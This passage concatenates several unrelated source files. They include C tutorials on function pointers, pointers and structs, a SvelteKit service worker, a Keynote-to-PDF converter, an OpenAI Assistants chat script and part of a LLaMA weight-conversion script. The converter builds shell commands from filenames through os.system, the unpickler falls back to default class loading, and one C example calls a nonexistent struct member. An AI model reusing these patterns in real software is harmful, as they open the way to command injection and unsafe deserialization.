 // to allow us to know when the char* ends.
 for (i = 0; expression[i] != '\0'; i++) {
 switch (expression[i]) {
 case '+':
 return sum;
 case '-':
 return sub;
        }
    }
}


void print_operator(char* expression) {
 // get_operator will return a function that takes two ints
 // and returns an int.
 int (*operator)(int, int) = get_operator(expression);
 // sum is automatically converted to a pointer,
 // you could also say ""operator == &sum"", but that is longer.
 if (operator == sum) { // comparing functions!
 printf(""Expression %s is a sum.\n"", expression);
    } else if (operator == sub) { // comparing functions again!!
 printf(""Expression %s is a sub.\n"", expression);
    } else {
 printf(""Expression %s has an unknown operation.\n"", expression);
    }
 // Challenge:
 // Instead of just printing out which operation it is,
 // find the two operands and perform the operation on them.
 // Then print the result of the expression instead.
}


int main() {
 char* expression1 = ""2 + 2"";
 char* expression2 = ""5 - 3"";
 char* expression3 = ""9 * 7"";


 print_operator(expression1);
 print_operator(expression2);
 print_operator(expression3);
}
/**
 * This is an example of more complex function usage in C.
 * Read structs.c before continuing.
 */


#include <stdio.h>


// Good reference:
// http://www.dirac.org/linux/programming/tutorials/function_pointers/


typedef struct {
 int legs;
 void (*sayName)(void);
} Animal;


void catSayName() {
 printf(""I am a cat.\n"");
}


void dogSayName() {
 printf(""I am a dog.\n"");
}


int sub(int a, int b) {
 return a - b;
}


int sum(int a, int b) {
 return a + b;
}


double sum_d(double a, double b) { return a + b; } // would fail if passed to operate: operate(sum_d, 1, 2)


int operate(int (*f)(int, int), int a, int b) {
 return f(a, b);
}


void do_nothing(void) {
 return;
}


int main() {
 Animal cat;
 cat.legs = 4;
 cat.sayName = catSayName;


 Animal cat1;
 cat1.legs = 4;
 cat1.sayName = catSayName;


 Animal dog;
 dog.legs = 3;
 dog.sayName = dogSayName;


 cat.sayName(); // I am a cat.
 dog.sayName(); // I am a dog.
 cat.sayLegs(cat.legs);


 int my_sum = operate(sum, 1, 2);
 printf(""%d\n"", my_sum); // Prints 3
 int my_sub = operate(sub, 11, 2);
 printf(""%d\n"", my_sub); // Prints 9


 do_nothing();
}
/**
 * This is a collection of pointer examples.
 * It is a fun way to test yourself. I'm
 * sorry I couldn't think of a better way
 * to show the answers.
 */


#include <stdio.h>


void print(int i) {
 printf(""%d\n"", i);
}


int main() {
 int* myInt;
 int myIntsValue = 3;
 myInt = &myIntsValue; // int* somePointer; *somePointer = myIntsValue; myInt = somePointer;
 print(*myInt); // prints 3
 int mySecondInt = 2;
 *myInt = mySecondInt;
 print(*myInt); // prints 2
 print(mySecondInt); // prints 2
 print(myIntsValue); // prints 2
 myInt = &mySecondInt; // int* somePointer; *somePointer = mySecondInt; myInt = somePointer;
 mySecondInt = 5;
 print(*myInt); // prints 5
 myIntsValue = 7;
 print(*myInt); // prints 5
 mySecondInt = myIntsValue;
 print(*myInt); // prints 7
}
/**
 * This is a continuation of (more complex)
 * pointer examples.
 */


#include <stdio.h>


void print(int i) {
 printf(""%d\n"", i);
}


void swap1(int a, int b) {
 int temp = b;
 b = a;
 a = temp;
}


void swap2(int* p_a, int* p_b) {
 int temp = *p_b;
 *p_b = *p_a;
 *p_a = temp;
}


int main() {
 int a = 1;
 int b = 2;
 swap1(a, b);
 print(a); // prints 1
 print(b); // prints 2
 swap2(&a, &b);
 print(a); // prints 2
 print(b); // prints 1
 int* c;
 int* d;
 c = &a; // c = some address... but *c = 2
 d = &b; // d = some address... but *d = 1
 swap1(*c, *d);
 print(*c); // prints 2
 print(*d); // prints 1
 swap2(c, d);
 print(*c); // prints 1
 print(*d); // prints 2
}
/**
 * This is a brief example of typedef-ing and structs in C.
 */


typedef int Int; // int or Int


struct Person {
 char* name;
 Int age;
};


typedef struct Person APerson; // struct Person or APerson


typedef struct Animal {
 int legs;
} Animal; // struct Animal or Animal


typedef struct {
 int mpg;
} Car; // cannot use struct Car, can only use Car... the struct is anonymous


int main() {
 APerson person; // could use ""struct Person person""
 person.name = ""Phil"";
 person.age = 10;


 Animal cat; // could use ""struct Animal cat;""
 cat.legs = 4;


 Car car; // could not use ""struct Car car;"" because the struct was anonymous
 car.mpg = 30;
}
"
"service-worker.js
","import { build, files, version } from '$service-worker';


// https://github.com/microsoft/TypeScript/issues/11781 - this is needed for TS and ESLint


/// env serviceworker
const globalThis = /** @type {unknown} */ (self);
/// <reference no-default-lib=""true""/>
/// <reference lib=""es2020"" />
/// <reference lib=""WebWorker"" />
const sw = /** @type {ServiceWorkerGlobalScope & typeof globalThis} */ (globalThis);


const ASSETS = `cache${version}`;


// `build` is an array of all the files generated by the bundler,
// `files` is an array of everything in the `static` directory
const to_cache = build.concat(files);
const staticAssets = new Set(to_cache);


/** @param {ExtendableEvent} event */
function install_listener(event) {
 event.waitUntil(
 caches
 .open(ASSETS)
 .then((cache) => cache.addAll(to_cache))
 .then(() => {
 sw.skipWaiting();
 })
 );
}


/** @param {ExtendableEvent} event */
function activate_listener(event) {
 event.waitUntil(
 caches.keys().then(async (keys) => {
 // delete old caches
 for (const key of keys) {
 if (key !== ASSETS)
 await caches.delete(key);
 }


 sw.clients.claim();
 })
 );
}


/**
 * Fetch the asset from the network and store it in the cache.
 * Fall back to the cache if the user is offline.
 * @param {RequestInfo} request
 */
async function fetchAndCache(request) {
 const cache = await caches.open(`offline${version}`);


 try {
 const response = await fetch(request);
 cache.put(request, response.clone());
 return response;
 } catch (err) {
 const response = await cache.match(request);
 if (response) return response;


 throw err;
 }
}


/** @param {FetchEvent} event */
function fetch_listener(event) {
 if (event.request.method !== 'GET' || event.request.headers.has('range'))
 return;


 const url = new URL(event.request.url);


 // don't try to handle e.g. data: URIs
 const isHttp = url.protocol.startsWith('http');
 const isDevServerRequest = url.hostname === sw.location.hostname && url.port !== sw.location.port;
 const isStaticAsset = url.host === sw.location.host && staticAssets.has(url.pathname);
 const skipBecauseUncached = event.request.cache === 'only-if-cached' && !isStaticAsset;


 if (isHttp && !isDevServerRequest && !skipBecauseUncached) {
 event.respondWith(
 (async () => {
 // always serve static files and bundler-generated assets from cache.
 // if your application has other URLs with data that will never change,
 // set this variable to true for them and they will only be fetched once.
 const cachedAsset = isStaticAsset && (await caches.match(event.request));


 // for pages, you might want to serve a build `service-worker-index.html` file.
 // It's not right for every app, but if it's right for yours then uncomment this section
 /*
				if (!cachedAsset && url.origin === sw.origin && routes.find(route => route.pattern.test(url.pathname))) {
					return caches.match('/service-worker-index.html');
				}
				*/
 return cachedAsset || fetchAndCache(event.request);
 })()
 );
 }
}


// prettier-ignore
sw.addEventListener('install' , install_listener);
// prettier-ignore
sw.addEventListener('activate', activate_listener);
// prettier-ignore
sw.addEventListener('fetch' , fetch_listener);
==<SEPERATOR>==
keynote2pdf.py
#!/usr/bin/env python
'''
File: keynote2pdf.py
Author: Adam Pah
Description: 
Converts a directory of keynote documents to pdfs
Hacky hack hack.
'''


#Standard path imports
from __future__ import division, print_function
import argparse
import os
import glob
import re


#Non-standard imports


#Global directories and variables


def fname_handler(inname):
 ninname = re.sub(' ', '\ ', inname)
 if '(' in ninname:
 ninname = '\('.join(ninname.split('('))
 if ')' in ninname:
 ninname = '\)'.join(ninname.split(')'))
 return ninname


def extract_pdf_filenames(keyfile):
 path_prefix = 'tmp/%s.qlpreview/' % keyfile
 npath_prefix = fname_handler(path_prefix)
 
 #re.sub(' ', '\ ', path_prefix)
 #if '(' in npath_prefix:
 #npath_prefix = '\('.join(npath_prefix.split('('))
 #if ')' in npath_prefix:
 #npath_prefix = '\)'.join(npath_prefix.split(')'))


 


 html_lines = [l.strip() for l in open(path_prefix + 'Preview.html').readlines() if 'img' in l]
 file_list = [npath_prefix + l.split('src=""')[-1].split('""')[0] for l in html_lines]
 return file_list


def main(args):
 if args.directory != './':
 glob_path = args.directory + '/*.key'
 else:
 glob_path = '*.key'
 #Start iterating
 for keyfile in glob.glob(glob_path):
 pdf_file = keyfile.split('.key')[0] + '.pdf'
 if os.path.exists('tmp') == False:
 #Make a temporary directory to house this crap
 os.mkdir('tmp')
 #Pull out the jamtown
 os.system('qlmanage -p -o tmp/ ""%s""' % keyfile)
 #Get the proper pdf file listing
 pdf_file_list = extract_pdf_filenames(keyfile)
 #Join the pdf files together
 pdf_file_string = ' '.join(pdf_file_list)
 os.system('""/System/Library/Automator/Combine PDF Pages.action/Contents/Resources/join.py"" -o %s %s;' % (fname_handler(pdf_file), pdf_file_string))




if __name__ == '__main__':
 parser = argparse.ArgumentParser(description="""")
 parser.add_argument('directory')
 args = parser.parse_args()
 main(args)
==<SEPERATOR>==
run_openai_assistants.py
# coding: utf-8
# !pip install -U openai


import time
from copy import deepcopy


import openai
from openai._types import NOT_GIVEN


openai.api_key = '<YOUR_API_KEY>'




DEFAULT_ASSISTANT_CONFIG = dict(
 name=""My Private Assistant"",
 description=""You are My Private Assistant. Answer my questions precisely and accurately."",
 model=""gpt-3.5-turbo-1106"",
 tools=[{""type"": ""code_interpreter""}, {""type"": ""retrieval""}],
)




class OpenAIAssistant(object):
 def __init__(self, assistant_config, files=None):
 _config = deepcopy(DEFAULT_ASSISTANT_CONFIG)
 _config.update(assistant_config)
 self._assistant_name = _config['name']


 files = files or []
 self.init_assistant(_config, files)


 def init_assistant(self, assistant_config, fps):
 file_ids = NOT_GIVEN
 if fps:
 file_ids = []
 for fp in fps:
 file = openai.files.create(file=open(fp, ""rb""), purpose='assistants')
 file_ids.append(file.id)


 self.assistant = openai.beta.assistants.create(
 name=assistant_config[""name""],
 description=assistant_config[""description""],
 model=assistant_config[""model""],
 tools=assistant_config[""tools""],
 file_ids=file_ids,
        )
 self.thread = openai.beta.threads.create()


 def talk(self):
 while True:
 question = input('You ==>: ')
 if question.lower().strip() in ('end', 'quit'):
 break
 response = self.ask(question)
 print(f'{self._assistant_name} ==>: {response}')


 def ask(self, question: str):
 thread_message = openai.beta.threads.messages.create(
 self.thread.id, role=""user"", content=question,
        )
 # print(thread_message)
 run = openai.beta.threads.runs.create(
 thread_id=self.thread.id, assistant_id=self.assistant.id
        )


 while True:
 response = openai.beta.threads.runs.retrieve(
 thread_id=self.thread.id, run_id=run.id,
            )
 if response.status in ('completed', 'failed', 'cancelled', 'expired'):
 res_status = response.status
 break
 time.sleep(1)


 thread_messages = openai.beta.threads.messages.list(self.thread.id)
 if res_status == 'completed':
 res, citations = self.extract_msg_response(thread_messages.data, run)
 if len(citations) > 0:
 print('\tcitations: {}'.format(citations))
 return res
 else:
 return f'Bad response status: {res_status}'


 @classmethod
 def extract_msg_response(cls, messages, run):
 msgs = [msg for msg in messages if getattr(msg, 'run_id') == run.id]
 if len(msgs) < 1:
 print('Warning: something went wrong, please check it manually.')
 breakpoint()
 message = msgs[0]


 # Extract the message content
 message_content = message.content[0].text
 annotations = message_content.annotations
 citations = []


 # Iterate over the annotations and add footnotes
 for index, annotation in enumerate(annotations):
 # Replace the text with a footnote
 message_content.value = message_content.value.replace(
 annotation.text, f' [{index}]'
            )


 # Gather citations based on annotation attributes
 if (file_citation := getattr(annotation, 'file_citation', None)) :
 cited_file = openai.files.retrieve(file_citation.file_id)
 citations.append(
 f'[{index}] {file_citation.quote} from {cited_file.filename}'
                )
 elif (file_path := getattr(annotation, 'file_path', None)) :
 cited_file = openai.files.retrieve(file_path.file_id)
 citations.append(
 f'[{index}] Click <here> to download {cited_file.filename}'
                )
 # Note: File download functionality not implemented above for brevity


 # Add footnotes to the end of the message before displaying to user
 # message_content.value += '\n' + '\n'.join(citations)


 return message_content.value, citations




if __name__ == '__main__':
 # # The easiest way to get started:
 # files = None
 # assistant_config = {
 #     ""name"": ""CnOCR Assistant"",
 # }


 # A more complex example:
 files = [""/Users/king/Downloads/cnocr.md""]  # just set to `None` if no files are needed
 description = """"""
CnOCR is a text recognition (Optical Character Recognition, referred to as OCR) toolkit under Python 3, 
which supports the recognition of common characters in Simplified Chinese, Traditional Chinese (some models), 
English and numbers, and the recognition of vertical text. 
Comes with 20+ trained recognition models for different application scenarios, 
and can be used directly after installation. The author of CnOCR is Breezedeus (https://www.breezedeus.com).
    """""" # noqa
 assistant_config = {
 ""name"": ""CnOCR Assistant"",
 ""description"": description,
 ""model"": ""gpt-3.5-turbo-1106"",
 ""tools"": [{""type"": ""code_interpreter""}, {""type"": ""retrieval""}],
    }
 assistant = OpenAIAssistant(assistant_config, files)
 assistant.talk()
"
"convert.py
","from sentencepiece import SentencePieceProcessor # type: ignore
import json, struct, os, re, zipfile, pickle, itertools, sys, enum, threading, concurrent.futures, argparse
from pathlib import Path
import numpy as np
from collections import namedtuple
from typing import Optional, Callable, Type, Any, Iterable, IO, Sequence, Union, TypeVar
from dataclasses import dataclass


NDArray = np.ndarray[Any, Any]


DataType = enum.Enum('DataType', ['F16', 'F32', 'I32', 'BF16', 'Q4_1'])


DATA_TYPE_TO_FTYPE: dict[DataType, int] = {
 DataType.F32: 0,
 DataType.F16: 1,
 DataType.Q4_1: 3,
}
DATA_TYPE_TO_NUMPY: dict[DataType, Type[np.generic]] = {
 DataType.F16: np.float16,
 DataType.F32: np.float32,
 DataType.I32: np.int32,
}


def make_tensors_list() -> list[str]:
 ret = [
 'tok_embeddings.weight',
 'norm.weight',
 'output.weight',
    ]
 for i in range(80): # maximum number of layer
 ret += [
 f'layers.{i}.attention.wq.weight',
 f'layers.{i}.attention.wk.weight',
 f'layers.{i}.attention.wv.weight',
 f'layers.{i}.attention.wo.weight',
 f'layers.{i}.attention_norm.weight',
 f'layers.{i}.feed_forward.w1.weight',
 f'layers.{i}.feed_forward.w2.weight',
 f'layers.{i}.feed_forward.w3.weight',
 f'layers.{i}.atttention_norm.weight',
 f'layers.{i}.ffn_norm.weight',
        ]
 return ret
TENSORS_LIST = make_tensors_list()
TENSORS_SET = set(TENSORS_LIST)


def always_want_f32(name: str) -> bool:
 return (name.endswith('.attention_norm.weight') or
 name.endswith('.ffn_norm.weight') or
 name == 'norm.weight')


@dataclass
class Params:
 n_vocab: int
 n_embd: int
 n_mult: int
 n_head: int
 n_layer: int
 file_type: int


 @staticmethod
 def guessed(model: 'LazyModel') -> 'Params':
 n_vocab, n_embd = model[""tok_embeddings.weight""].shape


 return Params(
 n_vocab = n_vocab,
 n_embd = n_embd,
 n_mult = 256,
 n_head = n_embd // 128,
 n_layer = next(i for i in itertools.count() if f""layers.{i}.attention.wq.weight"" not in model),
 file_type = Params.guess_file_type(model),
        )


 @staticmethod
 def guess_file_type(model: 'LazyModel') -> int:
 name_to_type: dict[str, DataType] = {}
 for name, tensor in model.items():
 if always_want_f32(name):
 assert tensor.data_type == DataType.F32, name
 else:
 name_to_type[name] = tensor.data_type


 types = set(name_to_type.values())
 if len(types) == 1:
 # All the same type.
 return DATA_TYPE_TO_FTYPE[next(iter(types))]


 # Could it be type 4?
 if all(data_type == (DataType.F16 if name in (""tok_embeddings.weight"", ""output.weight"")
 else DataType.Q4_1)
 for (name, data_type) in name_to_type.items()):
 return 4
 raise Exception(f""Unknown data types: {name_to_type}"")


class Vocab:
 def __init__(self, fname_tokenizer: Path, fname_added_tokens: Optional[Path]) -> None:
 self.sentencepiece_tokenizer = SentencePieceProcessor(str(fname_tokenizer))
 added_tokens: dict[str, int]
 if fname_added_tokens is not None:
 added_tokens = json.load(open(fname_added_tokens))
 else:
 added_tokens = {}
 vocab_size: int = self.sentencepiece_tokenizer.vocab_size()
 expected_ids = list(range(vocab_size, vocab_size + len(added_tokens)))
 actual_ids = sorted(added_tokens.values())
 if expected_ids != actual_ids:
 raise Exception(f""Expected added token IDs to be sequential and start at {len(added_tokens)}; got {actual_ids}"")
 items = sorted(added_tokens.items(), key=lambda text_idx: text_idx[1])
 self.added_tokens_list = [text for (text, idx) in items]
 self.vocab_size_base: int = vocab_size
 self.vocab_size: int = self.vocab_size_base + len(self.added_tokens_list)
 self.fname_tokenizer = fname_tokenizer
 self.fname_added_tokens = fname_added_tokens


 def sentencepiece_tokens(self) -> Iterable[tuple[bytes, float]]:
 tokenizer = self.sentencepiece_tokenizer
 for i in range(tokenizer.vocab_size()):
 text: bytes
 if tokenizer.is_unknown(i):
 text = "" \u2047 "".encode(""utf-8"")
 elif tokenizer.is_control(i):
 text = b""""
 elif tokenizer.is_byte(i):
 piece = tokenizer.id_to_piece(i)
 if len(piece) != 6:
 raise Exception(f""Invalid token: {piece}"")
 byte_value = int(piece[3:-1], 16)
 text = struct.pack(""B"", byte_value)
 else:
 text = tokenizer.id_to_piece(i).replace(""\u2581"", "" "").encode(""utf-8"")
 score: float = tokenizer.get_score(i)
 yield text, score


 def added_tokens(self) -> Iterable[tuple[bytes, float]]:
 for text in self.added_tokens_list:
 score = -1000.0
 yield text.encode(""utf-8""), score


 def all_tokens(self) -> Iterable[tuple[bytes, float]]:
 yield from self.sentencepiece_tokens()
 yield from self.added_tokens()


def dequantize_q4(qvalues_pack32: NDArray, scales: NDArray, addends: NDArray) -> NDArray:
 # First reinterpret each row from a list of int32s containing 8 values each
 # to a list of uint8s containing 2 values each.
 qvalues_pack8 = qvalues_pack32.view(np.uint8)


 # Then split out the two values per int8 (which requires an actual
 # conversion because numpy doesn't natively support int4s).
 qvalues = np.zeros([qvalues_pack8.shape[0], qvalues_pack8.shape[1] * 2], dtype=np.uint8)
 qvalues[:, 0::2] = qvalues_pack8 & 0xf
 qvalues[:, 1::2] = qvalues_pack8 >> 4


 assert addends.shape == scales.shape
 assert qvalues.shape[0] == scales.shape[0]
 assert qvalues.shape[1] % scales.shape[1] == 0
 repeat_count = qvalues.shape[1] // scales.shape[1]
 scales = scales[:, :, np.newaxis]
 addends = addends[:, :, np.newaxis]
 # Reshape so that the below computation broadcasts over scales and addends:
 qvalues.shape = (qvalues.shape[0], scales.shape[1], int(repeat_count))
 # And do the actual 'value = scale * qvalue + addend' computation.
 values = scales * qvalues
 values += addends
 values.shape = (values.shape[0], values.shape[1] * values.shape[2])
 return values


class UnquantizedTensor:
 def __init__(self, ndarray: NDArray) -> None:
 assert isinstance(ndarray, np.ndarray)
 self.ndarray = ndarray
 def astype(self, dtype: Type[np.generic]) -> 'UnquantizedTensor':
 return UnquantizedTensor(self.ndarray.astype(dtype))
 def ggml_ndarray(self) -> NDArray:
 return self.ndarray


def load_unquantized(lazy_tensor: 'LazyTensor', expected_dtype: Optional[Type[np.generic]] = None) -> NDArray:
 tensor = lazy_tensor.load()
 assert isinstance(tensor, UnquantizedTensor)
 if expected_dtype is not None:
 assert tensor.ndarray.dtype == expected_dtype, (tensor.ndarray.dtype, expected_dtype)
 return tensor.ndarray


class QuantizedTensor:
 def __init__(self, model: 'LazyModel', namebase: str, permute_n_head : Optional[int] = None) -> None:
 qweight = load_unquantized(model[f""{namebase}.qweight""], np.int32)
 scales = load_unquantized(model[f""{namebase}.scales""], np.float32)


 bias = model.get(f""{namebase}.bias"")
 if bias is not None:
 # Q4_1 does not support bias; good thing the bias is always all zeros.
 assert not np.any(load_unquantized(bias))


 if f""{namebase}.zeros"" in model:
 zeros = load_unquantized(model[f""{namebase}.zeros""], np.float32)
 else:
 qzeros = load_unquantized(model[f""{namebase}.qzeros""], np.int32)
 assert qzeros.dtype == np.int32
 zeros = dequantize_q4(qzeros, scales, scales)
 assert zeros.dtype == np.float32
 assert zeros.shape == scales.shape


 # Output is transposed compared to the input, and addends have their sign flipped.
 # Scales and zeros similarly must be transposed but only for newer
 # versions of GPTQ-for-LLaMa; the older versions can be identified by
 # having shape (n_embd, 1).
 qweight = qweight.T
 if scales.shape[1] != 1:
 scales = scales.T
 zeros = zeros.T


 # Output also has signs flipped for the addends.
 self.qweight = qweight
 self.scales = scales
 self.addends = -zeros


 self.shape = [self.qweight.shape[0], self.qweight.shape[1] * 8]
 self.permute_n_head = permute_n_head


 def inspect(self, row: int, col: int) -> None:
 '''For debugging.'''
 if self.permute_n_head is not None:
 permute_group_size = self.qweight.shape[0] // self.permute_n_head
 row_pg = row // permute_group_size
 row_pgoff = row % permute_group_size
 row_pgoff = (row_pgoff // 2) + (permute_group_size // 2) * (row_pgoff & 1)
 row = row_pg * permute_group_size + row_pgoff


 qweight = (self.qweight[row, col // 8] >> (4 * (col & 7))) & 0xf
 group = int(col // self.groupsize())
 scale = self.scales[row, group]
 addend = self.addends[row, group]
 with np.printoptions(precision=None, suppress=True):
 print(f'scale:{scale} addend:{addend} qweight:{qweight}')
 print('possible values:', np.arange(16) * scale + addend)
 print('actual value:', qweight * scale + addend)


 def astype(self, dtype: Type[np.generic]) -> UnquantizedTensor:
 '''Also for debugging.'''
 dequantized = dequantize_q4(np.ascontiguousarray(self.qweight), self.scales, self.addends)
 if self.permute_n_head is not None:
 old = dequantized
 dequantized = permute(dequantized, self.permute_n_head)
 return UnquantizedTensor(dequantized).astype(dtype)


 def groupsize(self) -> int:
 assert self.addends.shape == self.scales.shape
 assert self.shape[1] % self.scales.shape[1] == 0
 return self.shape[1] // self.scales.shape[1]


 def regroup(self, new_groupsize: int = 32) -> None:
 # Old versions of GPTQ-for-LLaMa shared scales and addends between all the
 # columns in a row.  Newer versions share them between every set of N
 # columns in a row, where N is the `groupsize` parameter, usually 128.  The
 # output format shares them between every set of 32 columns.  To handle
 # this, duplicate scales and addends for every smaller group.
 # (In the above, 'row' and 'column' are in the sense of the output.)
 old_groupsize = self.groupsize()
 assert old_groupsize >= new_groupsize and old_groupsize % new_groupsize == 0, old_groupsize
 self.addends = self.addends.repeat(old_groupsize // new_groupsize, axis=1)
 self.scales = self.scales.repeat(old_groupsize // new_groupsize, axis=1)


 def ggml_ndarray(self) -> NDArray:
 # The output format looks like this:
 # For each row:
 #   For each group of 32 columns:
 #     - addend (float32, 4 bytes)
 #     - scale (float32, 4 bytes)
 #     - weights (int4 * 32, 16 bytes)


 # Since the output format is mixed between integers and floats, we have
 # to hackily view the floats as int32s just so numpy will let us
 # concatenate them.
 self.regroup()
 addends_view = self.addends.view(dtype=np.int32)[:, :, np.newaxis]
 scales_view = self.scales.view(dtype=np.int32)[:, :, np.newaxis]


 # Split into groups of 4 columns (i.e. 32 columns of quantized data):
 grouped = self.qweight.reshape([self.qweight.shape[0], self.qweight.shape[1] // 4, 4])


 # And concatenate:
 grouped = np.concatenate([scales_view, addends_view, grouped], axis=2, casting='no')


 if self.permute_n_head is not None:
 grouped = permute(grouped, self.permute_n_head)
 return grouped




Tensor = Union[QuantizedTensor, UnquantizedTensor]


def permute(weights: NDArray, n_head: int) -> NDArray:
 return (weights.reshape(n_head, 2, weights.shape[0] // n_head // 2, *weights.shape[1:])
                   .swapaxes(1, 2)
                   .reshape(weights.shape))




@dataclass
class LazyTensor:
 load: Callable[[], Tensor]
 shape: Sequence[int]
 data_type: DataType


 def astype(self, data_type: DataType) -> 'LazyTensor':
 dtype = DATA_TYPE_TO_NUMPY[data_type]
 def load() -> Tensor:
 return self.load().astype(dtype)
 return LazyTensor(load, self.shape, data_type)


LazyModel = dict[str, LazyTensor]


def load_orig_llama_file(path: Path, first_model: LazyModel) -> LazyModel:
 models = []
 # Check for multi-file input
 m = re.match(r'^(.*)\.[0-9]{2}\.pth$', path.name)
 if m:
 # Load other .pth files
 base = m.group(1)
 for i in itertools.count():
 new_path = path.with_name(f""{base}.{i:02}.pth"")
 try:
 models.append(first_model if new_path == path else lazy_load_torch(new_path))
 except FileNotFoundError:
 break
 else:
 models.append(first_model)


 print(f""Loaded original LLaMA model split into {len(models)} parts."")


 # Original LLaMA models have each file contain one part of each tensor.
 names = sorted(name for model in models for name in model)
 combined: LazyModel = {}
 for name in names:
 lazy_tensors: list[LazyTensor] = [model[name] for model in models]
 if len(lazy_tensors[0].shape) == 1:
 # the tensor is just duplicated in every file
 combined[name] = lazy_tensors[0]
 continue
 if (name.startswith('tok_embeddings.') or
 name.endswith('.attention.wo.weight') or
 name.endswith('.feed_forward.w2.weight')):
 # split by columns
 axis = 1
 else:
 # split by rows
 axis = 0
 concatenated_shape = list(lazy_tensors[0].shape)
 concatenated_shape[axis] = sum(tensor.shape[axis] for tensor in lazy_tensors)
 def load(axis: int = axis, lazy_tensors: list[LazyTensor] = lazy_tensors) -> UnquantizedTensor:
 ndarrays = [load_unquantized(tensor) for tensor in lazy_tensors]
 concatenated: NDArray = np.concatenate(ndarrays, axis=axis)
 return UnquantizedTensor(concatenated)
 combined[name] = LazyTensor(load, concatenated_shape, lazy_tensors[0].data_type)
 return combined


def permute_lazy(lazy_tensor: LazyTensor, n_head: int) -> LazyTensor:
 def load() -> Tensor:
 tensor = lazy_tensor.load()
 if isinstance(tensor, UnquantizedTensor):
 return UnquantizedTensor(permute(tensor.ndarray, n_head))
 else: # QuantizedTensor
 tensor.permute_n_head = n_head
 return tensor
 return LazyTensor(load, lazy_tensor.shape, lazy_tensor.data_type)


def convert_transformers_to_orig(model: LazyModel) -> LazyModel:
 out: LazyModel = {}
 out[""tok_embeddings.weight""] = model[""model.embed_tokens.weight""]
 out[""norm.weight""] = model[""model.norm.weight""]
 out[""output.weight""] = model[""lm_head.weight""]


 n_head = model[f""model.layers.0.self_attn.q_proj.weight""].shape[1] // 128
 for i in itertools.count():
 if f""model.layers.{i}.self_attn.q_proj.weight"" not in model:
 break
 out[f""layers.{i}.attention.wq.weight""] = permute_lazy(model[f""model.layers.{i}.self_attn.q_proj.weight""], n_head)
 out[f""layers.{i}.attention.wk.weight""] = permute_lazy(model[f""model.layers.{i}.self_attn.k_proj.weight""], n_head)
 out[f""layers.{i}.attention.wv.weight""] = model[f""model.layers.{i}.self_attn.v_proj.weight""]
 out[f""layers.{i}.attention.wo.weight""] = model[f""model.layers.{i}.self_attn.o_proj.weight""]


 out[f""layers.{i}.feed_forward.w1.weight""] = model[f""model.layers.{i}.mlp.gate_proj.weight""]
 out[f""layers.{i}.feed_forward.w2.weight""] = model[f""model.layers.{i}.mlp.down_proj.weight""]
 out[f""layers.{i}.feed_forward.w3.weight""] = model[f""model.layers.{i}.mlp.up_proj.weight""]


 out[f""layers.{i}.attention_norm.weight""] = model[f""model.layers.{i}.input_layernorm.weight""]
 out[f""layers.{i}.ffn_norm.weight""] = model[f""model.layers.{i}.post_attention_layernorm.weight""]
 return out


def handle_quantization(model: LazyModel) -> LazyModel:
 '''Convert a model with entries for 'foo.qweight', 'foo.scales', etc.
    (which resolve to UnquantizedTensors with the raw data) to one with entries
    for 'foo.weight' (whicih resolve to QuantizedTensors).
    '''
 out: LazyModel = {}
 for key, lazy_tensor in model.items():
 if key.endswith("".qweight""):
 namebase = key.rsplit('.', 1)[0]
 orig_name = namebase + "".weight""
 def load(model: LazyModel = model, namebase: str = namebase) -> Tensor:
 return QuantizedTensor(model, namebase)
 assert len(lazy_tensor.shape) == 2
 real_shape = (lazy_tensor.shape[1], lazy_tensor.shape[0] * 8)
 out[orig_name] = LazyTensor(load, real_shape, DataType.Q4_1)
 else:
 out[key] = lazy_tensor
 return out


def load_transformers_file(path: Path, first_model: LazyModel) -> LazyModel:
 # Check for multi-file input
 m = re.match(r'(.*)-[0-9]{5}-of-([0-9]{5})\.bin$', path.name)
 if m:
 base, count = m.group(1), int(m.group(2))
 paths = [path.with_name(f""{base}-{i:05}-of-{count:05}.bin"") for i in range(1, count + 1)]
 else:
 paths = [path]


 print(f""Loaded 'transformers' model split into {len(paths)} parts."")


 # Transformers models don't split an individual tensor into multiple parts,
 # but do have multiple files with different sets of tensors.
 joined: LazyModel = {}
 for path in paths:
 for key, tensor in lazy_load_torch(path).items():
 if key in joined:
 sys.stderr.write(f""Warning: multiple .bin files contained {key!r}\n"")
 joined[key] = tensor
 return convert_transformers_to_orig(handle_quantization(joined))


# Functionality that simulates `torch.load` but where individual tensors are
# only loaded into memory on demand, not all at once.
# PyTorch can't do this natively as of time of writing:
# - https://github.com/pytorch/pytorch/issues/64327
# This allows us to de-shard without multiplying RAM usage, and also
# conveniently drops the PyTorch dependency (though we still need numpy).


@dataclass
class LazyStorageKind:
 data_type: DataType
@dataclass
class LazyStorage:
 load: Callable[[int, int], NDArray]
 kind: LazyStorageKind


class LazyUnpickler(pickle.Unpickler):
 def __init__(self, fp: IO[bytes], data_base_path: str, zip_file: zipfile.ZipFile):
 super().__init__(fp)
 self.data_base_path = data_base_path
 self.zip_file = zip_file
 def persistent_load(self, pid: Any) -> Any:
 assert pid[0] == 'storage'
 assert isinstance(pid[1], LazyStorageKind)
 data_type = pid[1].data_type
 filename_stem = pid[2]
 filename = self.data_base_path + '/' + filename_stem
 info = self.zip_file.getinfo(filename)
 def load(offset: int, elm_count: int) -> NDArray:
 dtype = DATA_TYPE_TO_NUMPY.get(data_type)
 if dtype is None:
 raise Exception(""tensor stored in unsupported format"")
 itemsize = dtype(0).itemsize
 fp = self.zip_file.open(info)
 fp.seek(offset * itemsize)
 size = elm_count * itemsize
 data = fp.read(size)
 assert len(data) == size
 return np.frombuffer(data, dtype)
 return LazyStorage(load=load, kind=pid[1])


 @staticmethod
 def lazy_rebuild_tensor_v2(storage: Any, storage_offset: Any, size: Any, stride: Any, requires_grad: Any, backward_hooks: Any, metadata: Any = None) -> LazyTensor:
 assert isinstance(storage, LazyStorage)
 def load() -> UnquantizedTensor:
 elm_count = stride[0] * size[0]
 return UnquantizedTensor(storage.load(storage_offset, elm_count).reshape(size))
 return LazyTensor(load, size, storage.kind.data_type)


 CLASSES: dict[Any, Any] = {
        ('torch._utils', '_rebuild_tensor_v2'): lazy_rebuild_tensor_v2,
        ('torch', 'BFloat16Storage'): LazyStorageKind(DataType.BF16),
        ('torch', 'HalfStorage'): LazyStorageKind(DataType.F16),
        ('torch', 'FloatStorage'): LazyStorageKind(DataType.F32),
        ('torch', 'IntStorage'): LazyStorageKind(DataType.I32),
    }
 def find_class(self, module: str, name: str) -> Any:
 if not module.startswith('torch'):
 return super().find_class(module, name)
 return self.CLASSES[(module, name)]


def lazy_load_torch(path: Path) -> LazyModel:
 zf = zipfile.ZipFile(path)
